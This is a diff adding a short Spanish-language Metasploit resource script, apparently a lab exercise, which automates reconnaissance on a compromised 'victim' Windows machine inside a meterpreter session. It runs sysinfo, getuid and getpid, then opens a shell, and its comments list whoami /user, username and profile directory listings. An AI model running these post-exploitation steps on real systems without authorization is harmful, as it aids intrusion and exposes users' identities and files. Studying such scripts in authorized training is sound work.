@@ -1,0 +1,26 @@
+# Script de msfconsole para extraer informacion del equipo victima
+# Uso: dentro de meterpreter escribir: resource extraer_info.rc
+# O al abrir msfconsole: sudo msfconsole -r extraer_info.rc
+
+# Estos comandos se ejecutan automaticamente cuando hay sesion activa
+
+# Informacion del sistema operativo
+sysinfo
+
+# Usuario actual (nombre)
+getuid
+
+# ID del proceso de meterpreter
+getpid
+
+# Abrir shell de Windows para sacar el SID
+shell
+
+# Dentro del shell de Windows se ejecutan estos comandos:
+# whoami /user         <- da el nombre y el SID
+# echo %username%      <- solo el nombre de usuario
+# dir                  <- listado del directorio actual
+# cd %userprofile%     <- ir al escritorio del usuario
+# dir                  <- listado del directorio del usuario
+
+# Para volver a meterpreter desde el shell de Windows: exit
